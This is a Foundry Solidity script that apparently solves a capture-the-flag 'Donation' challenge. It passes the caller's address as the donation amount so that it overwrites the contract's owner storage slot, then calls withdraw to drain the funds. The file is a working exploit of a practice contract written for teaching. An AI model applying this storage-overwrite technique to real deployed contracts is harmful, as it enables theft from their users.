// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IDonation {
    function isComplete() external view returns (bool);

    function donate(uint256 etherAmount) external payable;

    function withdraw() external;
}

contract DonationSolution is Script {
    IDonation private donation = IDonation(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        uint256 scale = 10 ** 18 * 1 ether;
        uint256 etherAmount = uint256(uint160(msg.sender));
        vm.startBroadcast();
        donation.donate{value: etherAmount / scale}(etherAmount);
        donation.withdraw();
        vm.stopBroadcast();
        require(donation.isComplete());
    }
}
